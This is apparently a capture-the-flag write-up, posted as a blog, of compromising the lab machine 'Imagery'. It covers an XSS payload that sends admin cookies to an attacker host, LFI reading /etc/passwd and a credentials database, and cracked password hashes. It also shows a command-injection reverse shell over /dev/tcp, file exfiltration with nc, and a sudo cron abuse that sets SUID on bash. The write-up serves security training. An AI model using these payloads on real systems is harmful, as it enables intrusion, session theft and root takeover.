@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Linux - Medium - Imagery - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Linux - Medium - Imagery</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1759057610934"
+                  >2025-09-28 13:06</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1759236635823"
+                  >2025-09-30 14:50</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<div><pre class="hljs"><code>PORT     STATE SERVICE VERSION
+<span class="hljs-number">22</span>/tcp   open  ssh     OpenSSH <span class="hljs-number">9.7</span>p<span class="hljs-number">1</span> Ubuntu <span class="hljs-number">7</span>ubuntu<span class="hljs-number">4.3</span> (Ubuntu Linux<span class="hljs-comment">; protocol 2.0)</span>
+| ssh-hostkey: 
+|   <span class="hljs-number">256</span> <span class="hljs-number">35</span>:<span class="hljs-number">94</span>:fb:<span class="hljs-number">70</span>:<span class="hljs-number">36</span>:<span class="hljs-number">1</span>a:<span class="hljs-number">26</span>:<span class="hljs-number">3</span><span class="hljs-keyword">c</span>:a<span class="hljs-number">8</span>:<span class="hljs-number">3</span><span class="hljs-keyword">c</span>:<span class="hljs-number">5</span>a:<span class="hljs-number">5</span>a:e<span class="hljs-number">4</span>:fb:<span class="hljs-number">8</span><span class="hljs-keyword">c</span>:<span class="hljs-number">18</span> (ECDSA)
+|_  <span class="hljs-number">256</span> <span class="hljs-keyword">c</span><span class="hljs-number">2</span>:<span class="hljs-number">52</span>:<span class="hljs-number">7</span><span class="hljs-keyword">c</span>:<span class="hljs-number">42</span>:<span class="hljs-number">61</span>:ce:<span class="hljs-number">97</span>:<span class="hljs-number">9</span>d:<span class="hljs-number">12</span>:d<span class="hljs-number">5</span>:<span class="hljs-number">01</span>:<span class="hljs-number">1</span><span class="hljs-keyword">c</span>:ba:<span class="hljs-number">68</span>:<span class="hljs-number">0</span>f:fa (ED<span class="hljs-number">25519</span>)
+<span class="hljs-number">8000</span>/tcp open  http    Werkzeug httpd <span class="hljs-number">3.1</span>.<span class="hljs-number">3</span> (Python <span class="hljs-number">3.12</span>.<span class="hljs-number">7</span>)
+|_http-title: Image Gallery
+|_http-server-header: Werkzeug/<span class="hljs-number">3.1</span>.<span class="hljs-number">3</span> Python/<span class="hljs-number">3.12</span>.<span class="hljs-number">7</span>
+Device <span class="hljs-keyword">type</span>: general purpose</code></pre></div>
+<p><img src="/_resources/90fc2ea6e02b4bdb9adeb77834e95254.png" /></p>
+<p>We can create an account and gain access to the upload image panel.</p>
+<p><img src="/_resources/e77ce262bbf1426eba34fd564e4b1692.png" /></p>
+<p>We can test it for a while but the site checks for any php extensions and the files are being downloaded by accessing the /images site all at once, with completly randomized names. This didnt seem like the way to get in.</p>
+<p><img src="/_resources/a86638c4fe1946a3af7fcbf018ba3b73.png" /></p>
+<p>Going back to the main site, we can see that there is also a report bug site.</p>
+<p><img src="/_resources/bd2a8b09f5a04c9a91385f60f0969a31.png" /></p>
+<p>We can try out the classic xss with <code>&lt;img src=1 onerror="document.location='http://&lt;ip&gt;/xss/'+ document.cookie"&gt;</code> and get the cookie back.</p>
+<p><img src="/_resources/9bc9ab12df5440909e94d85d84148280.png" /></p>
+<p>We can then replace our cookie with admin one…</p>
+<p><img src="/_resources/53246329c1f84dbbaec37611fe51db47.png" /></p>
+<p>…and gain access to the admin panel.</p>
+<p><img src="/_resources/c4bc4dacfeb24f76a8985fd4692fc57b.png" /></p>
+<h1 id="admin-panel">Admin panel</h1>
+<p>The first feature that should catch eye is “Download log”. Not because we are interested in the logs itself, but admin panel is usualy less secure and such features allow for LFI. The url structure suggests that it could be possible.</p>
+<p><img src="/_resources/48b579d0a02f4c56a3b2c00e23228a3d.png" /></p>
+<p>As hoped, it works.</p>
+<p><img src="/_resources/4e40db5c757245cab412d8b670e2e8e8.png" /></p>
+<p>Important users are mark, web and root. It’s probably not containred.</p>
+<div><pre class="hljs"><code><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span>
+<span class="hljs-symbol">web:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/web</span><span class="hljs-symbol">:/bin/bash</span>
+<span class="hljs-symbol">mark:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1002</span><span class="hljs-symbol">:</span><span class="hljs-number">1002</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/mark</span><span class="hljs-symbol">:/bin/bash</span></code></pre></div>
+<p>Unfortunetly the site is being hosted as user <code>web</code> so we can’t just grab <code>/home/mark/.ssh/id_rsa</code>. By guessing we can find /home/web/web/app.py. Reading it leads us to utils.py, then to config.py and then to db.json. This finaly gives us password hashes.</p>
+<div><pre class="hljs"><code><span class="hljs-attr">"users"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+    <span class="hljs-punctuation">{</span>
+        <span class="hljs-attr">"username"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"admin@imagery.htb"</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"password"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"5d9c1d507a3f76af1e5c97a3ad1eaa31"</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"isAdmin"</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"displayId"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"a1b2c3d4"</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"login_attempts"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"isTestuser"</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">false</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"failed_login_attempts"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"locked_until"</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">null</span>
+    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-punctuation">{</span>
+        <span class="hljs-attr">"username"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"testuser@imagery.htb"</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"password"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2c65c8d7bfbca32a3ed42596192384f6"</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"isAdmin"</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">false</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"displayId"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"e5f6g7h8"</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"login_attempts"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"isTestuser"</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"failed_login_attempts"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"locked_until"</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">null</span>
+    <span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">]</span></code></pre></div>
+<p>Putting them into crackstation gives us password for <code>testuser@imagery.htb</code>, <code>iambatman</code>.</p>
+<p><img src="/_resources/c7bdd1438b824a98b5bb8574681cf505.png" /></p>
+<p>That doesnt seem helpful, but we get to access this account which has new features enabled in the image menu.</p>
+<p><img src="/_resources/7b5817e82a634298ac644d1928322c93.png" /></p>
+<p><img src="/_resources/e1803a1f92b84f4290edd01ac33d8ae2.png" /></p>
+<p>We can intercept the request using burp and then modify one of the values to <code>";/bin/bash -c \" /bin/bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/4444 0&gt;&amp;1\";"</code> so we can establish a reverse shell.</p>
+<p><img src="/_resources/8a6dc51d6d4246b7b28637faec20e714.png" /></p>
+<div><pre class="hljs"><code>└─$ sudo nc -lvnp <span class="hljs-number">4444</span>
+<span class="hljs-symbol">sudo:</span> unable <span class="hljs-keyword">to</span> resolve host kali: Name <span class="hljs-built_in">or</span> service <span class="hljs-built_in">not</span> known
+listening <span class="hljs-keyword">on</span> [any] <span class="hljs-number">4444</span> ...
+connect <span class="hljs-keyword">to</span> [<span class="hljs-number">10.10</span>.<span class="hljs-number">14.69</span>] <span class="hljs-keyword">from</span> (UNKNOWN) [<span class="hljs-number">10.129</span>.<span class="hljs-number">73.125</span>] <span class="hljs-number">53632</span>
+<span class="hljs-symbol">bash:</span> cannot <span class="hljs-keyword">set</span> terminal process <span class="hljs-keyword">group</span> (<span class="hljs-number">1400</span>): Inappropriate ioctl <span class="hljs-keyword">for</span> device
+<span class="hljs-symbol">bash:</span> no job control <span class="hljs-keyword">in</span> this shell
+web@Imagery:~/web$ </code></pre></div>
+<h1 id="priv-esc-user">Priv esc (user)</h1>
+<p>Running linpeas finds an interesting file.</p>
+<p><img src="/_resources/e392f16f6b7b4cb8b9f616b744d36d75.png" /></p>
+<p>We can send files over using nc.</p>
+<div><pre class="hljs"><code><span class="hljs-comment"># On victim</span>
+<span class="hljs-attribute">cd</span> /var/backup
+<span class="hljs-attribute">nc</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">15</span>.xx <span class="hljs-number">2137</span> &lt; web_20250806_120723.zip.aes
+
+<span class="hljs-comment"># On attack machine</span>
+<span class="hljs-attribute">nc</span> -lvnp <span class="hljs-number">2137</span> &gt; web.zip.aes</code></pre></div>
+<p>Do a checksum just in case.</p>
+<div><pre class="hljs"><code>sha<span class="hljs-number">256</span>sum web.zip.aes 
+<span class="hljs-number">4</span>b<span class="hljs-number">575e42816</span>be<span class="hljs-number">79083</span>a<span class="hljs-number">2</span>a<span class="hljs-number">19</span><span class="hljs-keyword">c</span><span class="hljs-number">48</span>a<span class="hljs-number">998</span><span class="hljs-keyword">cc</span><span class="hljs-number">3</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>d<span class="hljs-number">5</span>ab<span class="hljs-number">0</span>f<span class="hljs-number">3</span>a<span class="hljs-number">7</span>fbac<span class="hljs-number">2</span>a<span class="hljs-number">468</span>dd<span class="hljs-number">2087e6820</span>  web.zip.aes</code></pre></div>
+<p>runningn <a title="https://raw.githubusercontent.com/BridgerAlderson/pyAesDecrypt/refs/heads/main/pyAesDecrypt.py" href="https://raw.githubusercontent.com/BridgerAlderson/pyAesDecrypt/refs/heads/main/pyAesDecrypt.py">pyaesdecrypt</a> gets us the password.</p>
+<div><pre class="hljs"><code>[SUCCESS] Password found: bestfriends
+[SUCCESS] Decrypted <span class="hljs-keyword">file</span>: .<span class="hljs-regexp">/decrypted/</span>web_decrypted.zip</code></pre></div>
+<p>Checking db.json from the zip, we get a new user, mark.</p>
+<div><pre class="hljs"><code>        <span class="hljs-punctuation">{</span>
+            <span class="hljs-attr">"username"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"mark@imagery.htb"</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">"password"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"01c3d2e5bdaf6134cec0a367cf53e535"</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">"displayId"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"868facaf"</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">"isAdmin"</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">false</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">"failed_login_attempts"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">"locked_until"</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">null</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">"isTestuser"</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">false</span>
+        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span></code></pre></div>
+<p>Crackstation gets us pass, <code>supersmash</code>.</p>
+<p><img src="/_resources/6f3892c9978e47f396ab66eb73317923.png" /></p>
+<p>We cant ssh, but just <code>su mark</code> in our revshell and we finaly get user flag.</p>
+<p>Shell stabilisationfor Qol.</p>
+<div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("bash")'</span>
+stty raw -<span class="hljs-built_in">echo</span> 
+^Z
+<span class="hljs-built_in">fg</span></code></pre></div>
+<h1 id="priv-esc-root">Priv esc (root)</h1>
+<p>Time to exploit sudo privs on charcol, whatever that is.</p>
+<div><pre class="hljs"><code>mark<span class="hljs-variable">@Imagery</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l
+Matching Defaults entries <span class="hljs-keyword">for</span> mark on <span class="hljs-symbol">Imagery:</span>
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>,
+    use_pty
+
+User mark may run the following commands on <span class="hljs-symbol">Imagery:</span>
+    (ALL) <span class="hljs-symbol">NOPASSWD:</span> /usr/local/bin/charcol</code></pre></div>
+<p>Looking online doesnt really help, as “charcol” returns images of charcoal, and “charcol linux” on 30/09/2025 already gives only writeups and this:</p>
+<p><img src="/_resources/9ba064ab13724560a31d93addfc5dcc7.png" /></p>
+<div><pre class="hljs"><code>mark<span class="hljs-variable">@Imagery</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>man charcol
+No manual entry <span class="hljs-keyword">for</span> charcol</code></pre></div>
+<p>Help suggests that we will have to somehow make a backup of <code>/etc/shadow</code> or just <code>/root</code> for flag.</p>
+<div><pre class="hljs"><code>sudo charcol <span class="hljs-keyword">help</span>
+usage: charcol.<span class="hljs-keyword">py</span> [--quiet] [-R] {<span class="hljs-keyword">shell</span>,<span class="hljs-keyword">help</span>} ...
+
+Charcol: A CLI tool <span class="hljs-keyword">to</span> create encrypted backup zip <span class="hljs-keyword">files</span>.
+
+positional arguments:
+  {<span class="hljs-keyword">shell</span>,<span class="hljs-keyword">help</span>}          Available commands
+    <span class="hljs-keyword">shell</span>               Enter <span class="hljs-keyword">an</span> interactive Charcol <span class="hljs-keyword">shell</span>.
+    <span class="hljs-keyword">help</span>                Show <span class="hljs-keyword">help</span> message <span class="hljs-keyword">for</span> Charcol <span class="hljs-built_in">or</span> <span class="hljs-keyword">a</span> specific <span class="hljs-keyword">command</span>.
+
+<span class="hljs-keyword">options</span>:
+  --quiet               Suppress <span class="hljs-keyword">all</span> informational output, showing <span class="hljs-keyword">only</span>
+                        warnings <span class="hljs-built_in">and</span> errors.
+  -R, --reset-password-<span class="hljs-keyword">to</span>-default
+                        Reset application password <span class="hljs-keyword">to</span> default (requires <span class="hljs-built_in">system</span>
+                        password verification).</code></pre></div>
+<p>Running <code>sudo charcol shell</code> asks for password 3 times and then gives a hint, that it can be reset using <code>reset password using charcol -R command</code> .</p>
+<div><pre class="hljs"><code>mark@Imagery:~$ sudo charcol -R
+
+Attempting <span class="hljs-keyword">to</span> reset Charcol application password <span class="hljs-keyword">to</span> default.
+[2025-09-30 12:28:02] [<span class="hljs-built_in">INFO</span>]<span class="hljs-built_in"> System </span>password verification required <span class="hljs-keyword">for</span> this operation.
+Enter<span class="hljs-built_in"> system </span>password <span class="hljs-keyword">for</span><span class="hljs-built_in"> user </span><span class="hljs-string">'mark'</span> <span class="hljs-keyword">to</span> confirm: 
+supersmash
+
+[2025-09-30 12:28:11] [<span class="hljs-built_in">INFO</span>]<span class="hljs-built_in"> System </span>password verified successfully.
+
+mark@Imagery:~$ sudo charcol shell
+
+First time setup: <span class="hljs-built_in">Set</span> your Charcol application password.
+Enter <span class="hljs-string">'1'</span> <span class="hljs-keyword">to</span> <span class="hljs-built_in">set</span> a new password, <span class="hljs-keyword">or</span> press Enter <span class="hljs-keyword">to</span> use <span class="hljs-string">'no password'</span> mode: 
+Are you sure you want <span class="hljs-keyword">to</span> use <span class="hljs-string">'no password'</span> mode? (<span class="hljs-literal">yes</span>/<span class="hljs-literal">no</span>): <span class="hljs-literal">yes</span>
+[2025-09-30 12:28:44] [<span class="hljs-built_in">INFO</span>]<span class="hljs-built_in"> Default </span>application password choice saved <span class="hljs-keyword">to</span> /root/.charcol/.charcol_config
+Using <span class="hljs-string">'no password'</span> mode. This choice has been remembered.
+Please restart the application <span class="hljs-keyword">for</span> changes <span class="hljs-keyword">to</span> take effect.
+mark@Imagery:~$ sudo charcol shell
+
+  ░██████  ░██                                                  ░██ 
+ ░██   ░░██ ░██                                                  ░██ 
+░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
+░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
+░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
+ ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
+  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
+                                                                    
+                                                                    
+                                                                    
+Charcol The Backup Suit - Development edition 1.0.0
+
+[2025-09-30 12:28:51] [<span class="hljs-built_in">INFO</span>] Entering Charcol interactive shell.<span class="hljs-built_in"> Type </span><span class="hljs-string">'help'</span> <span class="hljs-keyword">for</span> commands, <span class="hljs-string">'exit'</span> <span class="hljs-keyword">to</span> quit.
+charcol&gt; </code></pre></div>
+<p>We finaly get to use this tool. Running <code>backup -i /root</code> automaticly sets user to <code>root:root</code> and perms 644, so that wont work. Help tells us that charcol can run cronjobs.</p>
+<div><pre class="hljs"><code>- Status 2 <span class="hljs-params">(no app password)</span>, cron, unencrypted backup:
+  CHARCOL_NON_INTERACTIVE=<span class="hljs-literal">true</span> charcol auto add \
+  <span class="hljs-params">--schedule</span> <span class="hljs-string">"0 2 * * *"</span> <span class="hljs-params">--command</span> <span class="hljs-string">"charcol backup -i /home/user/docs"</span> \
+  <span class="hljs-params">--name</span> <span class="hljs-string">"Daily Docs Backup"</span> <span class="hljs-params">--log-output</span> &lt;log_file_path&gt;</code></pre></div>
+<p>That means that we can do basicly whatever we want, get a shell or just copy the flag.</p>
+<div><pre class="hljs"><code>auto add --schedule <span class="hljs-string">"* * * * *"</span> --command <span class="hljs-string">"chmod +s /usr/bin/bash"</span> --name <span class="hljs-string">"pwned"</span> 
+<span class="hljs-keyword">exit</span></code></pre></div>
+<p>Then just run using suid and that’s it. <code>/bin/bash -p</code>.</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
